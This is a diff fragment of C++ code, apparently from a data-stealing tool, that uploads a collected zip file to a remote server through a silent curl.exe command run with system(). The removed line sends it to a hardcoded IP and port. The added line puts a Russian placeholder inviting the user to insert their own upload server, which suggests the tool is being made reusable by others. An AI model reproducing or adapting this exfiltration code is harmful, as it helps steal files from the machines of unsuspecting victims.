@@ -107,7 +107,7 @@ int main() {
     if (!pathExists(zipPath)) return 1;
 
     std::ostringstream curl;
-    curl << "curl.exe -s -X POST -F \"file=@" << zipPath << "\" http://188.127.241.232:29263/upload";
+    curl << "curl.exe -s -X POST -F \"file=@" << zipPath << "\"ВАША ССЫЛКА НА upload НА ВАШЕМ САЙТЕ(ЗАГРУЗЧИК ФАЙЛОВ НА СЕРВЕР)";
 
     system(curl.str().c_str());
 
